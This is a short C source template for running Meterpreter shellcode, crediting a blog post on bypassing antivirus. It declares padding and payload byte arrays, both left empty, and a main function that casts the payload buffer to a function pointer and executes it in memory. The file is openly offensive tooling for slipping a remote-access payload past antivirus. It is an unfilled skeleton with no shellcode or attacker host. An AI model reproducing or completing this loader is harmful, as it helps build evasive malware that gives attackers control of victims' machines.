// Thanks to Chris Truncer for this
// https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/
// 

// This should be random padding
unsigned char padding[]=
""
;

// Our Meterpreter code goes here
unsigned char payload[]=

;

// Push Meterpreter into memory
int main(void) { 
  ((void (*)())payload)();
}
